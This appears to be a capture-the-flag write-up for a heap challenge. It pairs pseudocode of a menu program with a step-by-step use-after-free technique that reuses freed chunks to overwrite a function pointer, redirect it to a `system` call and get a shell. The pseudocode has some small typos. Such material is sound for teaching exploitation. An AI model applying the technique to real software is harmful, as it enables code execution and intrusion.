The pseudocode of the program looks like this

```cpp
typedef struct Food {
    void* func;
    char* name;
    char* contents;
} Food;

int num_food = 0;
Food* foods[6];

void main() {
    char* choice_buf;

    while(true) {
        read(0, choice, 4);
        switch(atoi(choice)) {
            case 1:
                masak();
                break;
            case 2:
                buang();
                break;
            case 3:
                hidang();
                break;
            case 4:
                exit(0);
                break;
        }
    }
}

void print_food(Food* food) {
    puts(food->contents);
}

void win(Food* food) {
    system(food->contents);
}

void masak() {
    if (num_food >= 6) return;

    for (int i = 0; i < 6; ++i) {
        if (!foods[i]) {
            foods[i] = malloc(0x18);
            foods[i]->func = print_food;
            foods[i]->name = malloc(100);
            read(0, foods[i]->name, 99);
            char* size; read(0, size; 4);
            foods[i]->content = malloc(atoi(size));
            read(0, foods[i]->content, atoi(size));
            puts("Siap!");
            break;
        }
    }
}

void buang() {
    char* index_buf; read(0, index, 4);
    int index = atoi(index_buf);
    if (foods[index]) {
        free(foods[index]->contents);
        free(foods[index]);
        puts("Tak sedap ye dik!");
    }
}

void hidang() {
    char* index_buf; read(0, index, 4);
    int index = atoi(index_buf);
    if (foods[index]) {
        foods[index]->func(&foods[index]);
    }
}
```

In summary,
1. `masak` lets us create a `Food` object that contains `func` a function pointer to `print_food`, `name` a buffer of size 100, `contents` a buffer of size that we choose.
2. `buang` to `free` a `Food` object from the heap
3. `hidang` to call the `func` function of a chosen `Food` object

It is interesting that a function is assigned to each `Food` object. What if we can overwrite that function pointer with something else, say `win`, then we can call `system` on anything we want? There is a use-after-free vulnerability that allows us to do this.

Although through `buang()` the `Food` objects are `free`'d, but `foods` still contains a pointer to these memory regions. So we just need to make sure after calling `buang()`, we call `masak()` in such a way that `malloc` will give us the address of one of the `Food` objects, then we can overwrite the `func` value of that `Food` object. 

It is possible to get the address of the previous `Food` objects from `malloc` because for small objects, when they are `free`'d, they will be put to the end of a free list. When `malloc` is called, it will check the free list and take an address from there if it is not empty.

This is the way I did it.

1. Create 2 `Food` objects with `contents` of any size that is not 0x18 (e.g 100) and write `/bin/sh` into them
2. `buang` these 2 `Food`s
3. Create another `Food` object with `contents` of size 0x18
4. Write address of `win` into `contents`
5. Get shell

This is how it will look like

**1. Create the 2 `Food` objects**

```plaintext
Food1
+------------+
| print_food |
+------------+        +-------+
| name       +------->+ food1 |
+------------+        +------+--+
| contents   +------->+ /bin/sh |
+------------+        +---------+

Food2
+------------+
| print_food |
+------------+        +-------+
| name       +------->+ food2 |
+------------+        +------+--+
| contents   +------->+ /bin/sh |
+------------+        +---------+
```

**2. Free the 2 `Food` objects**
```plaintext
free-list for size 0x18: (top is last freed object)
Food2
Food1
```

**3. Create a `Food` object**

```plaintext
     Food1
     +------------+
+--->+ print_food |
|    +------------+        +-------+
|    | name       +------> | food1 |
|    +------------+        +-------+-+
|    | contents   +------> | /bin/sh |
|    +------------+        +---------+
|
|    Food2/3
|    +------------+
|    | print_food |
|    +------------+        +-------+
|    | name       +------> | food3 |
|    +------------+        +-------+
|    | contents   +------+
|    +------------+      |
|                        |
+------------------------+
```

`Food2` and `Food3` share the same memory region because `malloc` will return the address of `Food2` first, as it is at the top of the free list. Then when `malloc` is called again with size 0x18 for `contents` of `Food3`, it will get the address of `Food1`.

Now it is quite straightforward, write address `win` into `contents` of `Food3`, then call `hidang` on `Food1` so that the program does `system("/bin/sh")`.
